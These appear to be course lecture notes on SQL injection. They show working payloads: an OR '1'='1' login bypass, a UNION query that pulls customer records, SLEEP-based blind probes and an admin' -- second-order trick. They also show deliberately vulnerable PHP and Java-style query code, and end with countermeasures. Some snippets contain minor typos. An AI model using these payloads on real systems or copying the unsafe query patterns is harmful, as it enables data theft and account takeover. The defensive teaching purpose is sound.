# 13 - SQL Injection

The objectives of SQLi are 

- **Elevation of privilege** - bypass authentication
- **Information disclosure** - read data that should not be accessible
- **Tampering** - modify or delete data without permission
- **Denial of service** - force the DB server to do costly operations

## Example

```php
$query = "SELECT userid FROM UsersTable WHERE user = '$_GET["user"]' "
         . "AND password = '$_GET["password"]'";
```

We can send a HTTP request

```
http://www.example.com/login.php?user=foo&password=bar' OR '1' = '1'
```

And the dynamic SQL query will be built from request parameters

```SQL
SELECT userid FROM usersTable WHERE user = 'foo'
AND password = 'bar' OR '1' = '1'
```

The `WHERE` condition is trivially true.

## SQLi Exploitation

### Find out who you are, what priviliges you have

```SQL
SELECT user();
SELECT grantee, privilege_type FROM information_scheme.user_privileges;
```

### Find out what data are available

```sql
SELECT table_schema, table_name, column_name FROM information_schema.columns
WHERE table_schema != 'mysql' AND table_schema != 'information schema'
```

### Data exfiltration using `UNION` statements

- Number and type of columns must match
- `NULL` for missing columns, convert data where possible `CAST('123' AS char)`

Example:

```
http://www.victim.com/products.asp?id=12+union+select+userid,first_name,second_name,NULL+from+customers
```

```SQL
SELECT id, type name, price FROM products WHERE id = 12 UNION
SELECT userid, first_name, second_name, NULL from customers
```

## Blind SQLi

Web-based interaction with a database may not display data as a response. We can use **side channels** to identify if the web app is vulnerable to SQL injection. Most commonly, this involves looking at the *time* it takes to serve a response; also error messages can help identify the vulnerability.

To do this, we can try paylaods that case a delay in processing. 

- In MySQL: `SLEEP()`
- In PostgreSQL: `pg_sleep()`

## Second Order SQLi

Untrusted data could be handled securely when it is first inserted into the database, avoiding injection. However, other application components later read data from the database, assuming it does not need sanitisation. To exploit this, the user may submit payloads that are dangerous only on the second usage.

Example:

1. Attacker registers username `admin' --`

2. Password reset code

   ```php
   pwd = escape(request.getParameter("new_password"));
   usr = session.getUsername();
   sql = "UPDATE USERS SET passwd='" + pwd + ' WHERE uname = '" + user + "'"
   ```

3. Attacker asks to reset his password to `hacked`

   ```SQL
   UPDATE USERS SET passwd='hacked' WHERE uname = 'admin' --'
   ```

## Countermeasures

- Input filtering
  - Escape blacklisted characters, PHP has `mysqli_real_escape_string()`
  - However, it's hard to capture all user input
  - Hard to escape correctly across multiple trust boundaries
- Prepared statements
  - Avoid building SQL commands piece-wise from strings
- Stored procedures
  - These are parameterised SQL queries stored in the database, so the database offers a fixed API to the application
- Static/dynamic analysis of server-side code interfacing with a database
  - Type systems
  - Taint analysis
    - Detect if untrusted input can reach the database without passing via a sanitisation function
- Rate limit requests to a web server or database server
- Web Application Firewall (WAF)
  - An IDS in front of the database, aware of the web application
  - Can detect and stop sequences of suspicious queries
- Rely on a programming framework
  - They have been carefully developed, reviewed, and tested
  - Sometimes vulnerabilities are inherited from the framework
  - May add uneccessary functionality, increasing the size of the trusted computing base
  - Users rarely understand all details of framework code, and consequences of using it

